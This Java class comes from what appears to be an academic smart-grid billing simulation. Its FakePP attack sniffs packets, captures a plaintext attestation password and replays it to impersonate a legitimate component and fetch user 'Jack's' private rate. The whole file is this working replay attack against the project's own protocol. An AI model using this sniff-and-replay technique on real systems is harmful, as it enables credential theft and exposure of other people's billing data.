package SmartGridBillingSenario.attack;

import SmartGridBillingSenario.message.Message;
import SmartGridBillingSenario.message.MessageType;
import SmartGridBillingSenario.message.QuoteAndRateResponseMessage;
import SmartGridBillingSenario.socket.SocketClient;
import SmartGridBillingSenario.utils.Utils;
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import lombok.extern.slf4j.Slf4j;
import org.apache.commons.lang3.StringUtils;
import org.pcap4j.packet.Packet;

import java.io.IOException;
import java.security.NoSuchAlgorithmException;
import java.util.Map;

import static SmartGridBillingSenario.utils.Utils.getTcpValue;

/**
 * Created by yuandai on 4/10/17.
 */
@Slf4j
public class FakePP extends Pcap4j {

    private String clientHost;
    private int serverPort;

    private FakePPClient fakePPClient;

    private String password;

    public FakePP(String clientHost, int serverPort) {
        super(clientHost);

        this.clientHost = clientHost;
        this.serverPort = serverPort;
    }

    @Override
    public void handleTcpData(String srcAddr, String dstAddr, String srcPort, String dstPort, Packet payload) {

        if (Integer.valueOf(dstPort) == serverPort) {
            log.info("Get Info send to server!!! HAHA!!!");

            byte[] tcpRawData = payload.getRawData();
            if (tcpRawData.length > 4) {
                String value = getTcpValue(tcpRawData);
                log.info("Package Aquired, value: {}", value);
                try {
                    Message message = Utils.stringToMessage(value);
                    if (message.getMessageType().equals(MessageType.ATTESTATION_REQUEST)) {
                        password = String.valueOf(message.getObject());
                        log.info("Get Real PP Password {}, can start Replace Attack", password);
                        startAttack();
                    }
                } catch (Exception e) {
                    return;
                }

            }
        }
    }


    /**
     * Get authentication for Real PP, replace Real PP for getting result for JACK
     */
    private void startAttack() throws IOException, NoSuchAlgorithmException, ClassNotFoundException {
        fakePPClient = new FakePPClient(clientHost, serverPort);
        String publicKey = fakePPClient.getPublicKey();
        String query = "Jack";

        String response = fakePPClient.setEncryptQueryAndGetPrice(query);
        log.info("Successfully replace the PP to steal the Rate for Jack!!");
    }


    private class FakePPClient extends SocketClient {

        public FakePPClient(String host, int port) {
            super(host, port);
        }


        private String getPublicKey() throws JsonProcessingException {
            log.info("Get Public Key!!");
            ObjectMapper mapper = new ObjectMapper();
            String jsonInString = mapper.writeValueAsString(new Message(MessageType.ATTESTATION_REQUEST, password));
            Message responseForPublicKey = sendToPort(jsonInString);
            return String.valueOf(responseForPublicKey.getObject());
        }

        private String setEncryptQueryAndGetPrice(String query) throws NoSuchAlgorithmException, IOException, ClassNotFoundException {

            if (StringUtils.isNotEmpty(query)) {
                // String encryptedQuery = Utils.encrypt(query, publicInfo.authPolicy);
                String encryptedQuery = query;
                log.info("Send Encrypted value to TRE");
                ObjectMapper mapper = new ObjectMapper();
                String jsonInString = mapper.writeValueAsString(new Message(MessageType.GET_PRICE, encryptedQuery));
                Map<String, Object> result = (Map<String, Object>) sendToPort(jsonInString).getObject();
                QuoteAndRateResponseMessage quoteAndRateResponseMessage = new QuoteAndRateResponseMessage(String.valueOf(result.get("quote")), Integer.valueOf(String.valueOf(result.get("rateValue"))));

                log.info("Great!! Rate Value for user: {} is {}", query, quoteAndRateResponseMessage.getRateValue());
                return String.valueOf(quoteAndRateResponseMessage.getRateValue());
            } else {
                return null;
            }
        }
    }
}
